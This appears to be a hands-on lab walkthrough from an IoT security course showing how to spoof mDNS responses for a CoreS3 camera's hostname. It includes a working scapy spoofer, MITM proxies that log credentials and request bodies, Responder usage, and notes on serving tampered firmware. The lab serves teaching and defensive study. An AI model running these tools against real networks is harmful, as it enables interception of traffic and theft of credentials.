# L24: mDNS Service Spoofing

## Goal
Spoof mDNS responses to redirect traffic intended for `cores3-cam.local` to an attacker-controlled machine, enabling MITM on the camera feed, OTA updates, and credential capture.

## Background

**Why this matters**: mDNS (Multicast DNS) allows zero-configuration hostname discovery on local networks. mDNS responses are unauthenticated multicast - any device on the network can respond with forged answers, redirecting traffic to an attacker. This is especially dangerous for IoT devices using mDNS hostnames for OTA URLs, web interfaces, and API endpoints.

**What you're looking for in IoT devices:**
- Devices advertising `.local` hostnames via mDNS
- Service discovery via `_http._tcp`, `_ipp._tcp`, `_ota._tcp`, etc.
- OTA update URLs using mDNS hostnames (e.g., `http://device.local/ota`)
- Applications or mobile apps that discover devices via mDNS/Bonjour
- Service metadata in DNS-SD TXT records (firmware version, device type)

**Why this happens:**
- mDNS (RFC 6762) has no authentication or integrity protection
- Any device on the local network can respond to queries on 224.0.0.251:5353
- First response wins - an attacker can race the legitimate device
- mDNS was designed for convenience on trusted networks, not adversarial environments

**On CoreS3**: The firmware advertises `cores3-cam.local` via mDNS with HTTP on port 80 and DNS-SD TXT records containing `CoreS3-CAM` and `1.0.0-debug`. Any device on the same network can spoof responses to redirect `cores3-cam.local` to an attacker IP.

**How mDNS works:**

```
mDNS Query/Response Flow:

1. Client wants to resolve "cores3-cam.local"
2. Client sends mDNS query to 224.0.0.251:5353 (multicast)
3. ALL devices on the network receive the query
4. The legitimate device responds with its IP address
5. The CLIENT ACCEPTS THE FIRST RESPONSE it receives

Attack scenario:
1. Client sends mDNS query for "cores3-cam.local"
2. Both the real device AND the attacker receive the query
3. Attacker responds FASTER with their own IP address
4. Client caches the attacker's IP for "cores3-cam.local"
5. All subsequent requests to cores3-cam.local go to the attacker

mDNS packet structure (UDP, port 5353):
+------------------+------------------+
| Transaction ID   | Flags (QR=1,AA=1)|
+------------------+------------------+
| Questions: 0     | Answers: 1       |
+------------------+------------------+
| Authority: 0     | Additional: 0    |
+------------------+------------------+
| Answer: cores3-cam.local  Type A    |
| TTL: 120  RDATA: <attacker_ip>      |
+------------------------------------------+
```

**DNS-SD service discovery:**

DNS-SD (RFC 6763) works on top of mDNS. The CoreS3 device advertises:
- Service type: `_http._tcp.local`
- Service name: `cores3-cam._http._tcp.local`
- TXT records: `device=CoreS3-CAM`, `firmware=1.0.0-debug`

These TXT records leak reconnaissance information to any device on the network.

## Hardware Setup

**What you need:**
- CoreS3 device running with mDNS enabled (standard firmware)
- Computer connected to the CoreS3 AP network
- Python 3 with `scapy` library (`pip install scapy`)
- Optional: A second client machine to demonstrate the redirect
- Optional: Wireshark for packet capture, `mitmproxy` for traffic inspection

**Installing dependencies:**
```bash
pip install scapy
sudo apt install -y avahi-utils
# Optional: pip install mitmproxy

python3 -c "from scapy.all import *; print('Scapy ready')"
```

## Lab Walkthrough

### Step 1: Confirm mDNS Service Advertisement

Verify the CoreS3 is advertising its hostname and services.

```bash
# Discover the device via avahi-browse
avahi-browse -art 2>/dev/null | grep -A 5 cores3

# Expected output:
# +   wlan0 IPv4 CoreS3-CAM                                _http._tcp           local
# =   wlan0 IPv4 CoreS3-CAM                                _http._tcp           local
#    hostname = [cores3-cam.local]
#    address = [192.168.4.1]
#    port = [80]
#    txt = ["device=CoreS3-CAM" "firmware=1.0.0-debug"]
```

```bash
# Or query mDNS directly with dig
dig @224.0.0.251 -p 5353 cores3-cam.local

# Expected output:
# ;; ANSWER SECTION:
# cores3-cam.local.    120    IN    A    192.168.4.1
```

Note the TXT records leaking device type and firmware version. There is no authentication on the mDNS response.

### Step 2: Capture and Analyze mDNS Traffic

Observe the query/response pattern and timing to prepare for spoofing.

```bash
# Capture mDNS traffic with tcpdump
sudo tcpdump -i wlan0 -n -v port 5353

# Expected (when a client resolves cores3-cam.local):
# 14:30:01 IP 192.168.4.100.5353 > 224.0.0.251.5353: [query] A? cores3-cam.local.
# 14:30:01 IP 192.168.4.1.5353 > 224.0.0.251.5353: [response] cores3-cam.local. A 192.168.4.1
```

```bash
# Or use Wireshark for detailed analysis
wireshark -i wlan0 -f "udp port 5353" -k &

# Display filter: dns.qry.name contains "cores3-cam"
```

Note the response TTL (typically 120s) - your spoofed response should use a higher TTL. Also note response timing, since you need to respond faster than the legitimate device.

### Step 3: Spoof mDNS Responses

Send forged mDNS responses mapping `cores3-cam.local` to your attacker IP.

```python
#!/usr/bin/env python3
"""mdns_spoof.py - Spoof mDNS responses for cores3-cam.local

Usage: sudo python3 mdns_spoof.py
"""
from scapy.all import *
import sys

ATTACKER_IP = "192.168.4.100"  # Your IP on the CoreS3 AP network
TARGET_NAME = "cores3-cam.local."
MDNS_ADDR = "224.0.0.251"
MDNS_PORT = 5353

def spoof_mdns(pkt):
    """Intercept mDNS queries and send spoofed responses."""
    if not pkt.haslayer(DNS):
        return
    if pkt[DNS].qr != 0:  # Only process queries (qr=0), not responses
        return

    for i in range(pkt[DNS].qdcount or 0):
        qname = pkt[DNS].qd[i].qname.decode()
        if "cores3-cam" not in qname:
            continue

        print(f"[*] mDNS query for {qname} from {pkt[IP].src}")

        # Craft spoofed response with high TTL
        resp = (
            IP(dst=MDNS_ADDR, ttl=255) /
            UDP(sport=MDNS_PORT, dport=MDNS_PORT) /
            DNS(
                id=0,        # mDNS responses use id=0
                qr=1,        # This is a response
                aa=1,        # Authoritative answer
                rd=0,        # No recursion desired
                qd=None,     # No questions section in response
                an=DNSRR(
                    rrname=TARGET_NAME,
                    type="A",
                    rclass=0x8001,  # Cache-flush + IN class
                    ttl=240,        # Higher TTL than legitimate (120)
                    rdata=ATTACKER_IP
                )
            )
        )
        send(resp, verbose=0)
        print(f"[+] Spoofed {TARGET_NAME} -> {ATTACKER_IP} (TTL=240)")

print(f"[*] mDNS spoofer active. Redirecting cores3-cam.local -> {ATTACKER_IP}")
print("[*] Listening for mDNS queries on 224.0.0.251:5353...")

sniff(filter="udp port 5353", prn=spoof_mdns, store=0)
```

```bash
# Run the spoof script (requires root for raw sockets)
sudo python3 mdns_spoof.py

# Expected output when a client queries:
# [*] mDNS spoofer active. Redirecting cores3-cam.local -> 192.168.4.100
# [*] Listening for mDNS queries on 224.0.0.251:5353...
# [*] mDNS query for cores3-cam.local. from 192.168.4.50
# [+] Spoofed cores3-cam.local. -> 192.168.4.100 (TTL=240)
```

```bash
# Verify the spoof from another terminal:
sudo systemd-resolve --flush-caches 2>/dev/null; avahi-resolve -n cores3-cam.local

# Expected: Should resolve to 192.168.4.100 instead of 192.168.4.1

dig @224.0.0.251 -p 5353 cores3-cam.local +short
# Expected: 192.168.4.100
```

The spoofed response uses TTL=240 (vs 120) and the `cache-flush` bit (0x8001) to replace cached entries. mDNS has no mechanism to verify response authenticity.

### Step 4: Set Up a Man-in-the-Middle Proxy

With mDNS spoofed, clients connect to your machine. A reverse proxy lets you intercept credentials and camera feeds while keeping the connection functional.

```bash
# Option A: Simple transparent proxy with socat
socat TCP-LISTEN:80,fork,reuseaddr TCP:192.168.4.1:80 &

# Test from a client with spoofed mDNS cache:
curl http://cores3-cam.local/
# Traffic goes: client -> your machine -> socat -> 192.168.4.1 -> response
```

```bash
# Option B: mitmproxy for full traffic inspection
mitmproxy --mode reverse:http://192.168.4.1 --listen-port 80

# Shows all intercepted requests: logins, JWT tokens, camera streams, OTA URLs
```

```bash
# Option C: Custom Python proxy that logs credentials
python3 << 'PROXY_EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.request
import sys

REAL_DEVICE = "http://192.168.4.1"

class ProxyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        url = REAL_DEVICE + self.path
        print(f"[INTERCEPT] GET {self.path}")

        auth = self.headers.get("Authorization", "")
        if auth:
            print(f"[CAPTURED] Authorization: {auth}")

        try:
            resp = urllib.request.urlopen(url)
            self.send_response(resp.status)
            for key, val in resp.getheaders():
                self.send_header(key, val)
            self.end_headers()
            self.wfile.write(resp.read())
        except Exception as e:
            self.send_error(502, str(e))

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""
        print(f"[INTERCEPT] POST {self.path}")
        print(f"[CAPTURED] Body: {body.decode('utf-8', errors='ignore')}")

        try:
            req = urllib.request.Request(REAL_DEVICE + self.path, data=body, method="POST")
            for key in self.headers:
                if key.lower() not in ("host", "content-length"):
                    req.add_header(key, self.headers[key])
            resp = urllib.request.urlopen(req)
            self.send_response(resp.status)
            self.end_headers()
            self.wfile.write(resp.read())
        except Exception as e:
            self.send_error(502, str(e))

print(f"[*] MITM proxy listening on port 80, forwarding to {REAL_DEVICE}")
HTTPServer(("0.0.0.0", 80), ProxyHandler).serve_forever()
PROXY_EOF
```

### Step 5: Intercept Sensitive Traffic

Trigger actions through the spoofed hostname to demonstrate credential theft, feed interception, and OTA tampering.

```bash
# From a client with the spoofed mDNS entry:

# 1. Intercept a login attempt
curl -X POST http://cores3-cam.local/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'

# Proxy logs: [CAPTURED] Body: {"username":"admin","password":"admin"}

# 2. Intercept camera stream
curl http://cores3-cam.local/stream?noauth=1 --output /dev/null &

# 3. Intercept OTA request (could serve malicious firmware)
curl -X POST http://cores3-cam.local/ota \
  -H "Content-Type: application/json" \
  -d '{"url":"http://update.example.com/firmware.bin"}'

# An attacker could modify the URL to serve backdoored firmware
```

### Step 6: Alternative Tool - Responder

Responder automates LLMNR/NBT-NS/mDNS poisoning simultaneously.

```bash
git clone https://github.com/lgandx/Responder.git
cd Responder

sudo python3 Responder.py -I wlan0 -v

# Expected output:
# [+] Listening for events...
# [*] [mDNS] Poisoned answer sent to 192.168.4.50 for name cores3-cam.local
```

### Step 7: Clean Up

```bash
# Stop the mDNS spoofer and proxy (Ctrl+C)
kill %1 2>/dev/null

# Flush mDNS cache on Linux clients
sudo systemd-resolve --flush-caches 2>/dev/null
sudo systemctl restart avahi-daemon 2>/dev/null

# Verify the device resolves correctly again
avahi-resolve -n cores3-cam.local
# Expected: cores3-cam.local  192.168.4.1
```

## Impact

- **Traffic interception**: All HTTP requests to `cores3-cam.local` redirected to the attacker. Credentials, JWT tokens, and API calls captured in plaintext.
- **Camera feed capture**: MJPEG stream can be intercepted, recorded, or replaced with a static image.
- **OTA firmware MITM**: Update requests routed through the attacker can serve backdoored firmware (no signature verification).
- **Reconnaissance via DNS-SD**: TXT records leak device type and firmware version.
- **Persistent cache poisoning**: High-TTL spoofed responses persist in client caches after the spoofer stops.
- **Real-world parallel**: mDNS spoofing has been used against printers, Chromecast, AirPlay, IoT hubs, and medical devices on hospital networks.

## References

- [RFC 6762 - Multicast DNS](https://datatracker.ietf.org/doc/html/rfc6762)
- [RFC 6763 - DNS-Based Service Discovery](https://datatracker.ietf.org/doc/html/rfc6763)
- [CWE-290: Authentication Bypass by Spoofing](https://cwe.mitre.org/data/definitions/290.html)
- [CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action](https://cwe.mitre.org/data/definitions/350.html)
- [mDNS Security Considerations (RFC 6762 Section 19)](https://datatracker.ietf.org/doc/html/rfc6762#section-19)
- [Responder - LLMNR/NBT-NS/mDNS Poisoner](https://github.com/lgandx/Responder)
- [Scapy Documentation](https://scapy.readthedocs.io/)
- [ESPmDNS Library](https://github.com/espressif/arduino-esp32/tree/master/libraries/ESPmDNS)
